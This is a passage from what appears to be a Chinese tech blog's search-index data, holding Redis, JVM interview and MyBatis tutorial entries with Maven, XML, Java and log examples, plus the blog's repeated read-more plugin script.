mylist_score_d 3 根据权值排序，并取出排名第一的元素（c）： 1redis&gt; SORT mylist by mylist_score_* limit 0 1 元素获取完成后，要移除该元素（c）： 1redis&gt; LREM mylist 0 c 特别注意：由于 SORT 命令与 LREM 命令是前后执行的，并不是原子操作，所以此方案并不是线程安全的。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"MyBatis 入门教程之二",url:"/posts/62ce5629.html",text:'前言 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java 数据库"},{title:"Java 虚拟机面试题之一",url:"/posts/56993278.html",text:'Java 虚拟机JVM 体系结构JVM 内存结构主要有三大块：栈、堆内存、方法区。堆内存是 JVM 中最大的一块，由新生代和老年代组成，不包括永久代（方法区）；而新生代内存又被分成 Eden 空间、From Survivor 空间、To Survivor 空间，默认情况下新生代按照 8:1:1 的比例来分配。方法区存储类信息、静态变量、常量、常量池等数据，是线程共享的区域，为了与 Java 堆区分，方法区还有一个别名 Non-Heap （非堆）。栈又分为 Java 虚拟机栈和本地方法栈，主要用于方法的执行。 JVM 垃圾收集机制GC 发生在堆中，GC 的类型如下： 次数上频繁收集新生代（Minor GC） 次数上少收集老年代（Full GC） 基本不动方法区 GC 算法 如何确定一个对象是否会被回收 引用计数算法（Reference Counting） 可达性分析算法（Reachability Analysis） GC 算法 复制算法（Copying） 标记 - 清除算法（Mark-Sweep） 标记 - 算法（Mark-Compact） 分代收集算法 GC 算法对比 复制算法 复制算法执行的速度较快，典型的空间换时间 当对象的存活率很高的时候，不断的复制操作会显得耗时 复制算法很明显的缺点就是浪费内存空间，因为将内存分为两块，一次只能使用一块，这也意味着分的块越大，浪费的内存越多 标记 - 清除算法 首先是速度慢，因为” 标记 - 清除算法” 在标记阶段需要使用递归的方式从根结点出发，不断寻找可达的对象；而在清除阶段又需要遍历堆内存中的所有对象，查看其是否被标记，然后清除；并且其实在程序进行 GC 的时候，JVM 中所有的 Java 程序都要进行暂停，俗称 Stop-The-World，后面会提到。 其次是其最大的缺点，使用这种算法进行清理而得的堆内存的空闲空间一般是不连续的，由于对象实例在堆内存中是随机存储的，所以在清理之后，会产生许多的内存碎片，如果这个时候来了一个很大的对象实例，尽管显示内存还足够，但是已经存不下这个大对象了，内存碎片太多会导致当程序需要为较大对象分配内存时无法找到足够的连续内存而不得不提前触发另一次垃圾收集动作。再者，这种零散的碎片对于数组的分配也不是很方便。 标记 - 整理算法 首先这种算法克服了” 标记 - 清除算法” 中会产生内存碎片的缺点，也解决了复制算法中内存减半使用的不足 而其缺点则是速度也不是很快，不仅要遍历标记所有可达结点，还要一个个可达存活对象的地址，所以导致其效率不是很高 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"MyBatis 入门教程之一",url:"/posts/ed9d29ae.html",text:'前言MyBatis 简介MyBatis 是支持定制化 SQL、存储过程以及高级映射的持久层框架（ORM）。MyBatis 可以使用简单的 XML 或注解用于配置和映射数据表，是将 POJO（Plain Old Java Objects）映射成数据表中的记录。 MyBatis 历史MyBatis 的前身是 Apache 的一个开源项目 iBatis，2010 年这个项目由 Apache Software Foundation 迁移到了 Google Code，并且改名为 MyBatis，最后于 2013 年 11 月 迁移到了 GitHub（至今）。iBATIS 一词来源于 “internet” 和 “abatis” 的组合，是一个基于 Java 的持久层框架。iBATIS 提供的持久层框架包括 SQL Maps 和 Data Access Objects（DAO）。 MyBatis 特点由于单纯的 JDBC 是将 SQL 写在代码块里，耦合度高且维护不易，所以就诞生了 ORM 框架，诸如 Hibernate、Mybatis 等。MyBatis 和 Hibernate 都是 对 JDBC 更加抽象的封装，底层都是 JDBC，这二者的区别在于 MyBatis 是一个半自动的持久化层框架，而 Hibernate 是一个全自动化的持久化层框架。为什么呢？我们知道 Hibernate 是旨在消除 SQL 语句，所以当我们使用 Hibernate 时我们可以不写一条 SQL，全交给框架来处理，但是在实际的开发过程中，针对特定的场景我们是需要自己定制优化 SQL 的，针对于此，Hibernate 提出了 HQL（与标准 SQL 类似，但是倾向于面向对象的风格），为此我们还需要学习下 HQL。而 MyBatis 与 Hibernate 最大的不同就是，MyBatis 是让我们自己编写 SQL 语句。可以看出这两者之间没有绝对的壁垒，如何选择就要视情况来定。更多 MyBatis 相关的资料可阅读 MyBatis 官方中文文档。 快速入门本节会介绍如何开发第一个 MyBatis 应用案例，其中的案例代码可以直接从 GitHub 下载。 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;properties&gt; &lt;jdk.version&gt;1.8&lt;/jdk.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;slf4j.version&gt;1.7.30&lt;/slf4j.version&gt; &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt; &lt;mybatis.version&gt;3.5.6&lt;/mybatis.version&gt; &lt;mybatis-generator&gt;1.4.0&lt;/mybatis-generator&gt; &lt;mysql-connector.version&gt;8.0.23&lt;/mysql-connector.version&gt;&lt;/properties&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;${junit.version}&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;${mybatis.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;${mysql-connector.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt; &lt;version&gt;${mybatis-generator}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; 创建 Maven 子模块工程在 Maven 子模块的 pom.xml 中引入以下依赖 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;artifactId&gt;mybatis-lesson-1&lt;/artifactId&gt;&lt;name&gt;mybatis-lesson-1&lt;/name&gt;&lt;parent&gt; &lt;groupId&gt;com.clay.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-share&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 在 Maven 子模块中创建实体类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.clay.mybatis.bean;public class Employee { private Long id; private String lastName; private String gender; private String email; public Long getId() { return id; } public void setId(Long id) { this.id = id; } public String getLastName() { return lastName; } public void setLastName(String lastName) { this.lastName = lastName; } public String getGender() { return gender; } public void setGender(String gender) { this.gender = gender; } public String getEmail() { return email; } public void setEmail(String email) { this.email = email; } @Override public String toString() { return this.id + "_" + this.lastName + "_" + this.gender + "_" + this.email; }} 在 Maven 子模块中创建 SQL 映射文件，主要内容是在命名空间 com.clay.mybatis.mapper.EmployeeMapper 中定义了一个名为 selectEmployee 的映射语句，这样就可以在 Java 代码中使用全限定名 com.clay.mybatis.mapper.EmployeeMapper.selectEmployee 来调用唯一的 SQL 映射语句 1234567891011&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;!-- 指定命名空间 --&gt;&lt;mapper namespace="com.clay.mybatis.mapper.EmployeeMapper"&gt; &lt;select id="selectEmployee" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 在 Maven 子模块中的 src/main/resources 目录下创建 db.properties 配置文件，其中包含了连接 MySQL 数据库所需的基础信息 1234dataSource.user=rootdataSource.password=123456dataSource.driverClass=com.mysql.cj.jdbc.DriverdataSource.jdbcUrl=jdbc:mysql://127.0.0.1:3306/mybatis_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC 在 Maven 子模块中的 src/main/resources 目录下创建 log4j.properties 配置文件，利用 Log4j 打印 MyBatis 的 SQL 语句 1234567891011121314151617181920212223242526log4j.rootLogger = DEBUG,console### 输出到控制台 ###log4j.appender.console = org.apache.log4j.ConsoleAppenderlog4j.appender.console.Target = System.outlog4j.appender.console.layout = org.apache.log4j.PatternLayoutlog4j.appender.console.layout.ConversionPattern = %d{ABSOLUTE} %5p %c{1}:%L - %m%n### 输出到日志文件 ###log4j.appender.file = org.apache.log4j.DailyRollingFileAppenderlog4j.appender.file.File = ${uplat.root}/WEB-INF/logs/platform.loglog4j.appender.file.DatePattern=_yyyyMMdd\'.log\'#log4j.appender.file.Append = true#log4j.appender.file.Threshold = INFOlog4j.appender.file.layout = org.apache.log4j.PatternLayoutlog4j.appender.file.layout.ConversionPattern =%-d{yyyy-MM-dd HH\\:mm\\:ss} [ %t\\:%r ] - [ %p ] %m%n### 打印MyBatis的SQL ####log4j.logger.com.ibatis=DEBUG#log4j.logger.com.ibatis.common.jdbc.SimpleDataSource=DEBUG#log4j.logger.com.ibatis.common.jdbc.ScriptRunner=DEBUG#log4j.logger.com.ibatis.sqlmap.engine.impl.SqlMapClientDelegate=DEBUGlog4j.logger.java.sql.Connection=DEBUGlog4j.logger.java.sql.Statement=DEBUGlog4j.logger.java.sql.PreparedStatement=DEBUG#log4j.logger.java.sql.ResultSet=DEBUG 在 Maven 子模块中的 src/main/resources 目录下创建 MyBatis 的主配置文件 mybatis-config.xml，其中包含了 MyBatis 的核心设置，包括获取数据库连接实例的数据源（DataSource）、决定事务作用域和控制方式的事务管理器（TransactionManager）以及注册 SQL 映射文件 123456789101112131415161718192021222324252627&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;&lt;configuration&gt; &lt;!-- 读取db.properties文件 --&gt; &lt;properties resource="db.properties" /&gt; &lt;environments default="development"&gt; &lt;environment id="development"&gt; &lt;!-- 配置事务 --&gt; &lt;transactionManager type="JDBC" /&gt; &lt;!-- 配置数据源 --&gt; &lt;dataSource type="POOLED"&gt; &lt;property name="url" value="${dataSource.jdbcUrl}" /&gt; &lt;property name="username" value="${dataSource.user}" /&gt; &lt;property name="password" value="${dataSource.password}" /&gt; &lt;property name="driver" value="${dataSource.driverClass}" /&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;!-- SQL映射文件 --&gt; &lt;mappers&gt; &lt;mapper resource="com/clay/mybatis/dao/EmployeeMapper.xml" /&gt; &lt;/mappers&gt;&lt;/configuration&gt; 在 Maven 子模块中创建主启动类，每个基于 MyBatis 的应用都是以一个 SqlSessionFactory 的实例为核心的，SqlSessionFactory 的实例可以通过 SqlSessionFactoryBuilder 获得。而 SqlSessionFactoryBuilder 则可以从 XML 配置文件或一个预先配置的 Configuration 实例来构建出 SqlSessionFactory 实例。从 XML 文件中构建 SqlSessionFactory 的实例非常简单，建议使用类路径下的资源文件进行配置。但也可以使用任意的输入流（InputStream）实例，比如用文件路径字符串或 file:// URL 构造的输入流。MyBatis 提供了一个名叫 Resources 的工具类，它包含一些实用方法，使得从类路径或其它位置加载资源文件更加容易。 123456789101112131415161718192021222324252627282930313233package com.clay.mybatis;import com.clay.mybatis.bean.Employee;import org.apache.ibatis.io.Resources;import org.apache.ibatis.session.SqlSession;import org.apache.ibatis.session.SqlSessionFactory;import org.apache.ibatis.session.SqlSessionFactoryBuilder;import java.io.IOException;import java.io.InputStream;public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { // 使用SqlSession实例，通过全限定名直接执行已经映射的SQL语句，参数说明如下： // 1) 全限定名（SQL映射文件中的命名空间 + id）：statement Unique identifier matching the statement to use. // 2) 执行SQL所需的参数：parameter A parameter object to pass to the statement. Employee employee = session.selectOne("com.clay.mybatis.mapper.EmployeeMapper.selectEmployee", 1); System.out.println(employee); } finally { if (session != null) { session.close(); } } }} MySQL 数据库初始化在 MySQL 里执行以下 SQL 语句创建数据库与数据库表，并插入测试数据 1234567891011CREATE DATABASE `mybatis_lesson` DEFAULT CHARACTER SET utf8;CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into t_employee values(null, \'Jim\',\'1\', \'jim@gmail.com\'); 工程的目录结构12345678910111213141516171819202122mybatis-share├── mybatis-lesson-1│&nbsp;&nbsp; ├── pom.xml│&nbsp;&nbsp; └── src│&nbsp;&nbsp; ├── main│&nbsp;&nbsp; │&nbsp;&nbsp; ├── java│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── com│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── clay│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── mybatis│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── bean│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── Employee.java│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── dao│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── EmployeeMapper.xml│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── MyBatisApplication.java│&nbsp;&nbsp; │&nbsp;&nbsp; └── resources│&nbsp;&nbsp; │&nbsp;&nbsp; ├── db.properties│&nbsp;&nbsp; │&nbsp;&nbsp; ├── log4j.properties│&nbsp;&nbsp; │&nbsp;&nbsp; └── mybatis-config.xml│&nbsp;&nbsp; └── test│&nbsp;&nbsp; └── java├── pom.xml└── README.md 代码测试执行主启动类 MyBatisApplication 的 main() 方法，若打印出以下日志信息，则说明 MyBatis 应用正常运行 12345678910111213141521:47:20,509 DEBUG LogFactory:105 - Logging initialized using \'class org.apache.ibatis.logging.slf4j.Slf4jImpl\' adapter.21:47:20,550 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.21:47:20,550 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.21:47:20,551 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.21:47:20,551 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.21:47:20,648 DEBUG JdbcTransaction:137 - Opening JDBC Connection21:47:20,997 DEBUG PooledDataSource:434 - Created connection 1564984895.21:47:20,998 DEBUG JdbcTransaction:101 - Setting autocommit to false on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@5d47c63f]21:47:21,005 DEBUG selectEmployee:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?21:47:21,058 DEBUG selectEmployee:137 - ==&gt; Parameters: 1(Integer)21:47:21,097 DEBUG selectEmployee:137 - &lt;== Total: 11_Jim_1_jim@gmail.com21:47:21,098 DEBUG JdbcTransaction:123 - Resetting autocommit to true on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@5d47c63f]21:47:21,099 DEBUG JdbcTransaction:91 - Closing JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@5d47c63f]21:47:21,099 DEBUG PooledDataSource:391 - Returned connection 1564984895 to pool. 面向接口编程在上面入门案例的 SQL 映射文件中，由于在命名空间 com.clay.mybatis.mapper.EmployeeMapper 里定义了一个名为 selectEmployee 的映射语句，这样就可以在 Java 代码中使用全限定名 com.clay.mybatis.mapper.EmployeeMapper.selectEmployee 来调用唯一的 SQL 映射语句，如下所示： 1Employee employee = session.selectOne("com.clay.mybatis.mapper.EmployeeMapper.selectEmployee", 1); MyBatis 另外还提供了一种面向接口的编程方式，可以直接映射到在命名空间中同名的映射器类（Mapper 类），并将已映射的 SQL 语句匹配到对应名称、参数和返回类型的方法，案例代码可以直接从 GitHub 下载。 第一步：创建 Mapper 接口类（映射器类） 123456789package com.clay.mybatis.dao;import com.clay.mybatis.bean.Employee;public interface EmployeeMapper { public Employee getById(Long id);} 第二步：在 SQL 映射文件中，指定命名空间为 Mapper 接口类的全类名，同时指定 id 的属性值为 Mapper 接口类的方法名 1234567891011&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;!-- 指定命名空间为Mapper接口类的全类名 --&gt;&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getById" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 第三步：通过 Mapper 接口类实现增删改查操作，值得一提的是，MyBatis 会为每个 Mapper 接口类自动创建一个代理对象（将 Mapper 接口类与 SQL 映射文件绑定在一起），最后由代理对象去执行增删改查方法 1234567891011121314151617181920public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { // MyBatis会自动创建一个代理对象，由代理对象去执行增删改查方法 EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); Employee employee = mapper.getById(1L); System.out.println(employee); } finally { if (session != null) { session.close(); } } }} 第四步：执行主启动类 MyBatisApplication 的 main() 方法，若打印出以下日志信息，则说明 MyBatis 应用正常运行 12345678910111213141522:13:27,834 DEBUG LogFactory:105 - Logging initialized using \'class org.apache.ibatis.logging.slf4j.Slf4jImpl\' adapter.22:13:27,872 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.22:13:27,872 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.22:13:27,873 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.22:13:27,873 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.22:13:27,993 DEBUG JdbcTransaction:137 - Opening JDBC Connection22:13:28,262 DEBUG PooledDataSource:434 - Created connection 27319466.22:13:28,262 DEBUG JdbcTransaction:101 - Setting autocommit to false on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@1a0dcaa]22:13:28,266 DEBUG getById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?22:13:28,304 DEBUG getById:137 - ==&gt; Parameters: 1(Long)22:13:28,330 DEBUG getById:137 - &lt;== Total: 11_Jim_1_jim@gmail.com22:13:28,331 DEBUG JdbcTransaction:123 - Resetting autocommit to true on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@1a0dcaa]22:13:28,331 DEBUG JdbcTransaction:91 - Closing JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@1a0dcaa]22:13:28,332 DEBUG PooledDataSource:391 - Returned connection 27319466 to pool. 你可能会注意到，这种方式和用全限定名调用 Java 对象的方法类似。这样，该命名就可以直接映射到在命名空间中同名的映射器类，并将已映射的 select 语句匹配到对应名称、参数和返回类型的方法。因此你就可以像上面那样，不费吹灰之力地在对应的映射器接口调用方法。第二种方式有很多优势，首先它不依赖于字符串字面值，会更安全一点；其次，如果你的 IDE 有代码补全功能，那么代码补全可以帮你快速选择到映射好的 SQL 语句。 进阶使用命名空间在之前版本的 MyBatis 中，命名空间（Namespaces）的作用并不大，是可选的。但现在，随着命名空间越发重要，必须指定命名空间。命名空间的作用有两个，一个是利用更长的全限定名来将不同的语句隔离开来，同时也为了实现接口绑定。就算你觉得暂时用不到接口绑定，你也应该遵循这里的规定，以防哪天你改变了主意。长远来看，只要将命名空间置于合适的 Java 包命名空间之中，你的代码会变得更加整洁，也有利于你更方便地使用 MyBatis。 为了减少输入量，MyBatis 对所有具有名称的配置元素（包括语句，结果映射，缓存等）使用了如下的命名解析规则： 全限定名：比如 com.mypackage.MyMapper.selectAllThings，将被直接用于查找及使用 短名称：比如 selectAllThings，如果该名称全局唯一也可以作为一个单独的引用。如果不唯一，有两个或两个以上的相同名称（比如 com.foo.selectAllThings 和 com.bar.selectAllThings），那么使用时就会产生短名称不唯一的错误，这种情况下就必须使用全限定名 对于像 EmployeeMapper 这样的映射器类来说，还有另一种方法来完成语句映射。它们映射的语句可以不用 XML 来配置，而可以使用 Java 注解来配置。比如，上面的 XML 入门示例可以被替换成如下的配置： 12345678910package com.clay.mybatis.dao;import com.clay.mybatis.bean.Employee;public interface EmployeeMapper { @Select("select id, last_name as lastName, gender, email from t_employee where id = #{id}") public Employee getById(Long id);} 使用注解来映射简单语句会使代码显得更加简洁，但对于稍微复杂一点的语句，Java 注解不仅力不从心，还会让你本就复杂的 SQL 语句更加混乱不堪。 因此，如果你需要做一些很复杂的操作，最好用 XML 来映射语句。选择何种方式来配置映射，以及认为是否应该要统一映射语句定义的形式，完全取决于你和你的团队。换句话说，永远不要拘泥于一种方式，你可以很轻松的在基于注解和 XML 的语句映射方式间自由移植和切换。 作用域（Scope）和生命周期理解不同作用域和生命周期类别是至关重要的，因为错误的使用会导致非常严重的并发问题。依赖注入框架可以创建线程安全的、基于事务的 SqlSession 和映射器，并将它们直接注入到你的 Bean 中，因此可以直接忽略它们的生命周期。如果对如何通过依赖注入框架使用 MyBatis 感兴趣，可以研究一下 MyBatis-Spring 或 MyBatis-Guice 这两个子项目。 SqlSessionFactoryBuilder这个类可以被实例化、使用和丢弃，一旦创建了 SqlSessionFactory，就不再需要它了。 因此 SqlSessionFactoryBuilder 实例的最佳作用域是方法作用域（也就是局部方法变量）。你可以重用 SqlSessionFactoryBuilder 来创建多个 SqlSessionFactory 实例，但最好还是不要一直保留着它，以保证所有的 XML 解析资源可以被释放给更重要的事情。 SqlSessionFactorySqlSessionFactory 一旦被创建就应该在应用的运行期间一直存在，没有任何理由丢弃它或重新创建另一个实例。使用 SqlSessionFactory 的最佳实践是在应用运行期间不要重复创建多次，多次重建 SqlSessionFactory 被视为一种代码 坏习惯。因此 SqlSessionFactory 的最佳作用域是应用作用域。有很多方法可以做到，最简单的就是使用单例模式或者静态单例模式。 SqlSession每个线程都应该有它自己的 SqlSession 实例。SqlSession 的实例不是线程安全的，因此是不能被共享的，所以它的最佳的作用域是请求或方法作用域。绝对不能将 SqlSession 实例的引用放在一个类的静态域，甚至一个类的实例变量也不行。也绝不能将 SqlSession 实例的引用放在任何类型的托管作用域中，比如 Servlet 框架中的 HttpSession。如果你现在正在使用一种 Web 框架，可以考虑将 SqlSession 放在一个和 HTTP 请求相似的作用域中。换句话说，每次收到 HTTP 请求，就可以打开一个 SqlSession，返回一个响应后就关闭它。这个关闭操作很重要，为了确保每次都能执行关闭操作，你应该把这个关闭操作放到 finally 块中。下面的示例就是一个确保 SqlSession 关闭的标准代码： 123try (SqlSession session = sqlSessionFactory.openSession()) { // 应用逻辑代码} 或者 12345678SqlSession session = sqlSessionFactory.openSession();try { // 应用逻辑代码} finally { if (session != null) { session.close(); }} 在所有代码中都遵循这种使用模式，可以保证所有数据库资源都能被正确地关闭。 映射器实例映射器是一些绑定映射语句的接口。映射器接口的实例是从 SqlSession 中获得的，虽然从技术层面上来讲，任何映射器实例的最大作用域与请求它们的 SqlSession 相同。但方法作用域才是映射器实例的最合适的作用域。也就是说，映射器实例应该在调用它们的方法中被获取，使用完毕之后即可丢弃。映射器实例并不需要被显式地关闭，尽管在整个请求作用域保留映射器实例不会有什么问题，但是你很快会发现，在这个作用域上管理太多像 SqlSession 的资源会让你忙不过来。因此，最好将映射器放在方法作用域内，就像下面的例子一样： 1234try (SqlSession session = sqlSessionFactory.openSession()) { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); // 应用逻辑代码} 不使用 XML 构建 SqlSessionFactory如果你更愿意直接从 Java 代码而不是 XML 文件中创建配置，或者想要创建你自己的配置建造器，MyBatis 也提供了完整的配置类，提供了所有与 XML 文件等价的配置项。 123456DataSource dataSource = BlogDataSourceFactory.getBlogDataSource();TransactionFactory transactionFactory = new JdbcTransactionFactory();Environment environment = new Environment("development", transactionFactory, dataSource);Configuration configuration = new Configuration(environment);configuration.addMapper(EmployeeMapper.class);SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(configuration); 注意该例中，Configuration 添加了一个映射器类（Mapper Class）。映射器类是 Java 类，它们包含 SQL 映射注解从而避免依赖 XML 文件。不过，由于 Java 注解的一些限制以及某些 MyBatis 映射的复杂性，要使用大多数高级映射（比如：嵌套联合映射），仍然需要使用 XML 配置。有鉴于此，如果存在一个同名 SQL 映射文件（XML），MyBatis 会自动查找并加载它；在这个例子中，基于类路径和 EmployeeMapper.class 的类名，会加载 EmployeeMapper.xml。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java 数据库"},{title:"Spring 面试题之一",url:"/posts/16617d7.html",text:'Spring 基础Spring Bean 的五个作用域 类别 说明 singleton 在整个 Spring IOC 容器中，使用 singleton 定义的 Bean 将只有一个实例 prototype 每次通过容器的 getBean () 方法获取 prototype 定义的 Bean 